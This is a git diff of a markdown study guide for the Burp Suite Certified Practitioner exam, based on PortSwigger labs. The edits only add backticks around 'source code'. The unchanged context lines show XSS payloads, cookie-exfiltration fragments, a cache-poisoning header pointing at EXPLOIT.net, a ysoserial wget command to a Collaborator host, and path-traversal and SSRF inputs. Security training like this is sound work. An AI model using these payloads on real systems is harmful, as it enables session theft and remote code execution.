@@ -69,7 +69,7 @@ git-cola --repo 0ad900ad039b4591c0a4f91b00a600e7.web-security-academy.net/
 
 [PortSwigger Lab: Information disclosure in version control history](https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-in-version-control-history)  
 
->Always open source code to look for any developer comments that reveal hidden files or paths. Below example lead to [symphony token deserialization](#deserialization).  
+>Always open `source code` to look for any developer comments that reveal hidden files or paths. Below example lead to [symphony token deserialization](#deserialization).  
 
 ![dev-code-debug-comment deserial](images/dev-code-debug-comment.png)  
   
@@ -88,7 +88,7 @@ git-cola --repo 0ad900ad039b4591c0a4f91b00a600e7.web-security-academy.net/
 ### Identify DOM-XSS  
 
 >DOM-based XSS vulnerabilities arise when JavaScript takes data from an attacker-controllable source, such as the URL, and passes code to a sink that supports dynamic code execution. 
->Test the what characters enable escaping the source code injection point, fuzzer string.  
+>Test the what characters enable escaping the `source code` injection point, fuzzer string.  
 
 ```
 <>\'\"<script>{{7*7}}$(alert(1)}fuzzer
@@ -145,7 +145,7 @@ git-cola --repo 0ad900ad039b4591c0a4f91b00a600e7.web-security-academy.net/
 
 ### Doc Write Location search  
 
->The target is vulnerable to DOM-XSS in the stock check function. Source code reveal ```document.write``` is the sink used with ```location.search``` allowing us to add **storeId** query parameter with a value containing the JavaScript payload inside a ```<select>``` statement.  
+>The target is vulnerable to DOM-XSS in the stock check function. `source code` reveal ```document.write``` is the sink used with ```location.search``` allowing us to add **storeId** query parameter with a value containing the JavaScript payload inside a ```<select>``` statement.  
 
 ![DOM-XSS doc write inside select](images/dom-xss-doc-write-inside-select.png)  
 
@@ -245,7 +245,7 @@ git-cola --repo 0ad900ad039b4591c0a4f91b00a600e7.web-security-academy.net/
 
 ### DOM XSS AddEventListener JavaScript URL  
 
->Reviewing the page source code we ***identify*** the ```addeventlistener``` call for a web message but there is if condition checking if strings contains ```http/s```.
+>Reviewing the page `source code` we ***identify*** the ```addeventlistener``` call for a web message but there is if condition checking if strings contains ```http/s```.
 
 ![source-code-web-message-url.png](images/source-code-web-message-url.png)  
 
@@ -261,7 +261,7 @@ git-cola --repo 0ad900ad039b4591c0a4f91b00a600e7.web-security-academy.net/
   
 ### DOM XSS AddEventListener Ads Message  
 
->In the source code we ***identify*** the call using ```addEventListener``` and element id ```ads``` reference.  
+>In the `source code` we ***identify*** the call using ```addEventListener``` and element id ```ads``` reference.  
 
 ![Source code web message ads](images/source-code-web-message-ads.png)  
 
@@ -295,7 +295,7 @@ git-cola --repo 0ad900ad039b4591c0a4f91b00a600e7.web-security-academy.net/
 
 ### DOM-XSS LastviewedProduct Cookie  
 
->Identify the cookie ```lastViewedProduct``` is set to the last URL visited under the product page. In the source code we identify the injection script tags where ```window.location``` is set.   
+>Identify the cookie ```lastViewedProduct``` is set to the last URL visited under the product page. In the `source code` we identify the injection script tags where ```window.location``` is set.   
 
 ![DOM-XSS lastViewedProduct cookie code](images/dom-xss-lastViewedProduct-cookie.png)  
 
@@ -341,7 +341,7 @@ I am unable to get a working cookie stealer payload for this vulnerable lab.....
 
 + [Tiny XSS Payloads](https://github.com/terjanq/Tiny-XSS-Payloads)  
 
->Set a unsecured test cookie in browser using browser DEV tools console to use during tests for POC XSS cookie stealer payload on myself.  
+>Set a unsecured test cookie in browser using browser DEV tools console to use during tests for POC XSS cookie stealer payloads.  
 
 ```JavaScript
 document.cookie = "TopSecret=UnsecureCookieValue4Peanut2019";
@@ -481,7 +481,7 @@ location = 'https://TARGET.net/?search=%3Cxss+id%3Dx+onfocus%3Ddocument.location
 
 ### Reflected String XSS  
 
->Submitting a search string and reviewing the source code of the search result page, the JavaScript string variable is ***identified*** to reflect the search string in the code variable named ```searchTerms```.  
+>Submitting a search string and reviewing the `source code` of the search result page, the JavaScript string variable is ***identified*** to reflect the search string in the code variable named ```searchTerms```.  
 
 ![JavaScript string with single quote and backslash escaped](images/javascript-string-reflection.png)  
 
@@ -503,7 +503,7 @@ location = 'https://TARGET.net/?search=%3Cxss+id%3Dx+onfocus%3Ddocument.location
   
 ### Reflected String Extra Escape  
 
->See in source code the variable named ```searchTerms```, and when submitting payload ```fuzzer'payload```, see the single quote is backslash escaped, and then send a  ```fuzzer\payload``` payload and ***identify*** that the backslash is not escaped.  
+>See in `source code` the variable named ```searchTerms```, and when submitting payload ```fuzzer'payload```, see the single quote is backslash escaped, and then send a  ```fuzzer\payload``` payload and ***identify*** that the backslash is not escaped.  
 
 ```
 \'-alert(1)//  
@@ -654,7 +654,7 @@ body:document.cookie
 
 ### Stored DOM XSS  
 
->In the JavaScript source code ***identify*** the ```html.replace()``` function inside the custom ```loadComments```, and testing payloads we see the function only replaces the first occurrence.  
+>In the JavaScript `source code` ***identify*** the ```html.replace()``` function inside the custom ```loadComments```, and testing payloads we see the function only replaces the first occurrence.  
 
 ![stored dom-xss code replace](images/stored-dom-xss-code.png)  
 
@@ -680,7 +680,7 @@ body:document.cookie
 >Target use **tracking.js** JavaScript, and is vulnerable to **```X-Forwarded-Host```** or **```X-Host```** header redirecting path, allowing the stealing of cookie by poisoning cache.
 >***Identify*** the web cache headers in response and the tracking.js script in the page source code. Exploit the vulnerability by hosting JavaScript and injecting the header to poison the cache of the target to redirect a victim visiting.  
 
-![Tracking Source code review](images/tracking-code-review.png)  
+![Tracking `source code` review](images/tracking-code-review.png)  
   
 ```html
 X-Forwarded-Host: EXPLOIT.net
@@ -1454,7 +1454,7 @@ csrf=TOKEN&username=administrator
 
 >If the application **Refresh Password** feature is flawed, this vulnerability can be exploited without any user clicking on link or interaction. This can lead to identifying valid users accounts or privilege escalation.  
 
->***Identify*** in the source code for the ```/forgot-password``` page the username is a hidden field.  
+>***Identify*** in the `source code` for the ```/forgot-password``` page the username is a hidden field.  
 
 ![Password reset hidden username](images/passwoed-reset-hidden-username.png)  
 
@@ -1906,7 +1906,7 @@ X-Original-URL: /admin
   
 ## CORS  
 
->***Identify*** in the source code the account details are requested with AJAX request.  
+>***Identify*** in the `source code` the account details are requested with AJAX request.  
 
 ![cors-ajax-request.png](images/cors-ajax-request.png)  
 
@@ -2214,7 +2214,7 @@ csrf=ftU8wSm4rqdQ2iuSZUwSGmDnLidhYjUg&username=carlos
 
 ### HTML to PDF  
 
->**Identify** a PDF download function and the source code uses ```JSON.stringify``` to create html on download. This HTML-to-PDF framework is vulnerable to SSRF attack. Partial source code for JavaScript on the target ```downloadReport.js```.  
+>**Identify** a PDF download function and the `source code` uses ```JSON.stringify``` to create html on download. This HTML-to-PDF framework is vulnerable to SSRF attack. Partial `source code` for JavaScript on the target ```downloadReport.js```.  
 
 ```JavaScript
 function downloadReport(event, path, param) {
@@ -2279,7 +2279,7 @@ body: JSON.stringify({
   
 ### SSRF Open Redirection  
 
->The target make **GET** request to the ***next product*** on the e-commerce site, using a **path** parameter. On the stockAPI POST request the value provided in body data is the partial path to internal system. See product page source code below.  
+>The target make **GET** request to the ***next product*** on the e-commerce site, using a **path** parameter. On the stockAPI POST request the value provided in body data is the partial path to internal system. See product page `source code` below.  
 
 ![ssrf-open-redirection-code.png](images/ssrf-open-redirection-code.png)  
   
@@ -2548,7 +2548,7 @@ GET /admin_controls/metrics/admin-image?imagefile=%252e%252e%252f%252e%252e%252f
 
 ### XXE via SVG Image upload  
 
->***Identify*** image upload on the blog post function that accept **svg** images, and observe that the avatars already on blog source code is **svg** extensions.  
+>***Identify*** image upload on the blog post function that accept **svg** images, and observe that the avatars already on blog `source code` is **svg** extensions.  
 
 >The content of the image.svg file uploaded:  
 
@@ -2605,11 +2605,11 @@ fileurl=https://EXPLOIT.net/images.sVg
   
 ### CustomTemplate PHP  
 
->Reading page source code and noticing comment mentioning **<!-- TODO: Refactor once /libs/CustomTemplate.php is updated -->**, this ***identify*** possible PHP framework and the Burp scanner ***identify*** serialized session cookie object after we logged in with stolen ```wiener:peter``` credentials.  
+>Reading page `source code` and noticing comment mentioning **<!-- TODO: Refactor once /libs/CustomTemplate.php is updated -->**, this ***identify*** possible PHP framework and the Burp scanner ***identify*** serialized session cookie object after we logged in with stolen ```wiener:peter``` credentials.  
 
 ![info-disclose](images/info-disclose.png)  
 
->Reviewing PHP source code by adding tilde ***~*** character at end of GET request ```https://target.net/libs/CustomTemplate.php~```, we notice the **destruct** method.  
+>Reviewing PHP `source code` by adding tilde ***~*** character at end of GET request ```https://target.net/libs/CustomTemplate.php~```, we notice the **destruct** method.  
 
 ![comments-in-source-code](images/comments-in-source-code.png)  
 
@@ -2672,7 +2672,7 @@ java -jar /opt/ysoserial/ysoserial.jar CommonsCollections4 'wget http://Collabor
 
 >***Identify*** that the cookie contains a Base64-encoded token, signed with a SHA-1 HMAC hash. On the home page we discover a developer comment to debug info for ```/cgi-bin/phpinfo.php```, revealing the digital signature to sign new token.   
 
->**Note:** In BSCP exam not going to run this as it delete the file, but in exam read source code to ***identify*** the ```unserialize()``` PHP function and extract content out-of-band using ```PHPGGC```.  
+>**Note:** In BSCP exam not going to run this as it delete the file, but in exam read `source code` to ***identify*** the ```unserialize()``` PHP function and extract content out-of-band using ```PHPGGC```.  
 
 >Exploit steps to perform a PHP deserialization with a pre-built gadget chain.  
 
